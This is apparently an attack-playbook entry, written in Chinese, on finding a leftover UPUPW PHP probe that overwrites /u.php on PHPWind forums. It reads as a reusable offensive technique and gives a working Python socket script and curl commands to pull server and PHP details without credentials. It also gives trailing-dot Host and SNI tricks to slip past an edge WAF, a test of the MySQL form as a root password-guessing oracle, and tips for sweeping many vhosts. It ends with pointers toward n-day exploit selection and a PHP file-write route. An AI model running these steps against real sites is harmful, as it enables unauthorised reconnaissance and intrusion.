# UPUPW PHP探针安全版 19.07.18SF 覆盖 /u.php —— 多 vhost 零凭证环境泄露（MySQL 表单已证否为口令 oracle）

## 指纹 / 判据（一眼认）
- `<title>UPUPW PHP探针安全版</title>`，整页 8.9~9.8KB
- 正文固定字段：`UPUPW探针版本` / `服务器域名` / `服务器环境` / `PHP运行环境` / `Memory限制` / `Upload限制` / `POST限制` / `Execution超时` / `已编译模块`
- 含 `<form method="post" action="/u.php">` 的「数据库连接测试」，字段 `mysqlHost`（硬编码默认 `127.0.0.1`）/`mysqlPort`/`mysqlUser`/`mysqlPassword`
- 强判据（证明是"文件被覆盖"而非正常页面）：同路径原 PHPWind 功能（个人中心、`?action=uploadicon` 头像上传）全部失效，任何 `action` 参数都返回同一份探针页、同长度、同 title。
- 多 vhost 判据：同一源站不同 Host 命中同一份探针页，diff 仅 `服务器域名` 一行与时间戳。

## 前置条件
- 目标为 PHPWind（常见 7.x）论坛，运维遗留探针被放在 Web 根下，且路径恰好与原程序文件重名（本例 `/u.php`）
- 不需要任何账号 / Cookie / Referer
- **443 需 TLS SNI 与 Host 都用尾点写法** `www.TARGET.`；否则边缘设备按精确域名 RST
- **898/80 明文需 Host 尾点写法** `TARGET.`
- 本机 HTTP 代理常把请求打成 502 → `--noproxy '*'`，或直接 raw socket 连源站 IP

## 复现

### A) 443 HTTPS（raw socket + 尾点 SNI，最稳）
```python
import socket, ssl, time

IP   = "TARGET_IP"
SNI  = "www.TARGET_DOMAIN."      # 尾点必须保留：既作 SNI 也作 Host
ctx  = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

s = ctx.wrap_socket(socket.create_connection((IP, 443), timeout=10),
                    server_hostname=SNI)
req = (f"GET /u.php HTTP/1.1\r\n"
       f"Host: {SNI}\r\n"
       f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"
       f"Accept: text/html,*/*\r\nConnection: close\r\n\r\n")
s.sendall(req.encode())

buf = b""
while True:
    d = s.recv(65536)
    if not d:
        break
    buf += d

print(buf.split(b"\r\n\r\n", 1)[0].decode("latin-1"))   # 状态行 + 头
print("UPUPW:", "UPUPW探针版本".encode() in buf, "len:", len(buf))
```
期望：`HTTP/1.1 200 OK` + `Set-Cookie: PHPSESSID=...`，body 约 8985B，命中 `UPUPW探针版本:19.07.18SF`、`服务器域名 www.TARGET`、`服务器环境 nginx/1.30.4`、`PHP运行环境 fpm-fcgi PHP/5.3.29`。

curl 等价写法：
```bash
curl -sS --noproxy '*' -D - --resolve 'www.TARGET_DOMAIN.:443:TARGET_IP' \
  -H 'Accept: text/html,*/*' \
  "https://www.TARGET_DOMAIN./u.php"
```

### B) 898 / 80 明文（同一文件、另一 webroot）
```bash
curl -sS --noproxy '*' -D - \
  -H 'Host: TARGET_DOMAIN.' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0' \
  "http://TARGET_IP:898/u.php"
```
期望：200、body 约 8986B，与 A 的 diff 仅 `服务器域名`（回显当前 Host）与页面时间戳。

### C) 负样本对照（排除全站反代）
```
GET /ck.php HTTP/1.1
Host: www.TARGET_DOMAIN.
Connection: close
```
期望：404 / 约 138B ⇒ 说明探针只存在于特定路径，不是整站被反代。

## 判据
- 200 + `UPUPW探针安全版` + 上述参数行 ⇒ 成立
- 泄露内容：服务器域名、nginx 版本、PHP 版本与 SAPI（fpm-fcgi）、内存/上传/POST/执行超时限制、已编译扩展清单（pdo_mysql、sockets、zip、mcrypt、Phar、Zend Guard Loader 等）
- 同目录可顺手试 `p.php / php.php / i.php / phpinfo.php / tz.php`，同类探针常成组遗留
- 站群打法：把已知的每个 vhost 依次塞进 Host 打同一路径，命中率往往很高（运维把同一份探针复制到多个 webroot）

## 已证否：MySQL 连接测试表单不是口令 oracle（19.07.18SF）
```
POST /u.php HTTP/1.1
Host: www.TARGET_DOMAIN.
Content-Type: application/x-www-form-urlencoded
Content-Length: N
Connection: close

mysqlHost=127.0.0.1&mysqlPort=3306&mysqlUser=root&mysqlPassword=<GUESS>&act=测试
```
- 现象：任意口令均返回 200，**正文恒为 10048B**，文案恒为「数据库连接测试错误拒绝显示」
- 即不存在 2003（未监听） / 1045（口令错） / 连接成功 三态差异 ⇒ 安全版把真实错误吞掉了
- 结论：**不要用它枚举/爆破本机 3306**，零信息增益，还白白触发风控
- 备注：非安全版（老 UPUPW 探针）可能保留三态，届时需现场各取一次样本再判；本版本不要试

## 失败时的常见原因
| 现象 | 原因 | 处置 |
|---|---|---|
| 连接被 RST / 空响应 | 边缘 WAF 对精确 Host 拦截 | Host 改 `target.domain.`（尾点） |
| TLS handshake EOF / alert | SNI 用了无尾点的域名 | SNI 也改成 `target.domain.` |
| 502 / 空体 | 本机 HTTP 代理劫持 | `--noproxy '*'` 或 raw socket 直连 IP |
| 404 / 跳 PHPWind 登录 | 探针不在该路径 | 换常见探针名；本条不成立 |
| 200 但标题是 PHPWind 用户中心 | 未被覆盖，只是正常页面 | 本条不成立 |

## 影响
- 非预期暴露主机名、中间件与 PHP 精确版本、运行参数与扩展清单 → 直接支撑 Nday 选型（PHP 5.3 + fpm-fcgi + 具体扩展）
- 暴露运维遗留文件的存在，侧面证明 webroot 管理松散，可作为上传/写文件类路线的辅助情报
- 该路径上的业务功能（用户中心 / 头像上传）已被破坏

## 关联打法
- 拿 PHPWind 精确版本与表前缀：知识库 `phpwind-站点精确版本与数据库表前缀的无认证识别`
- 探针若进一步暴露绝对路径/配置，可接 PHPWind 写 PHP sink 路线：知识库 `phpwind-写-php-文件-sink-的三面叠加扫描法-数据来源分类-变量路径补扫`
